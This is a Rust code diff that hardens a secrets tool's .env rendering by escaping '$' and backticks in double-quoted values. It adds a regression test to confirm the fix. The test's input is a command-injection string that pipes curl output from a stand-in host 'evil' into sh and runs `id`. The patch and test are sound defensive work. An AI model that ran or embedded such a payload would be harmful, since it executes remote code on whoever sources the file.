@@ -91,6 +91,8 @@ fn render_env(secrets: &Secrets) -> Zeroizing<String> {
                 match character {
                     '\\' => output.push_str("\\\\"),
                     '"' => output.push_str("\\\""),
+                    '$' => output.push_str("\\$"),
+                    '`' => output.push_str("\\`"),
                     '\n' => output.push_str("\\n"),
                     '\r' => output.push_str("\\r"),
                     '\t' => output.push_str("\\t"),
@@ -235,7 +237,7 @@ fn push_unescaped(value: &mut String, escaped: char) {
         'n' => value.push('\n'),
         'r' => value.push('\r'),
         't' => value.push('\t'),
-        '"' | '\\' | '$' => value.push(escaped),
+        '"' | '\\' | '$' | '`' => value.push(escaped),
         other => {
             value.push('\\');
             value.push(other);
@@ -345,6 +347,18 @@ URL=postgres://user:p=ss@host/db
         let parsed = parse_dotenv(input);
         assert_eq!(pairs(&parsed), [("OK".to_owned(), "1".to_owned())]);
         assert_eq!(parsed.rejected_lines, [2, 3, 4, 5, 6]);
+    }
+
+    #[test]
+    fn double_quoted_values_cannot_run_commands_when_sourced() {
+        let hostile = "x'$(curl evil|sh) `id` ${HOME} \"q\"\n";
+        let rendered = render(&secrets(&[("A", hostile)]), Format::Env).unwrap();
+        let line = text(&rendered);
+        assert!(line.starts_with("A=\""));
+        assert!(!line.replace("\\$", "").contains('$'), "{line}");
+        assert!(!line.replace("\\`", "").contains('`'), "{line}");
+        let parsed = parse_dotenv(line);
+        assert_eq!(pairs(&parsed), [("A".to_owned(), hostile.to_owned())]);
     }
 
     #[test]
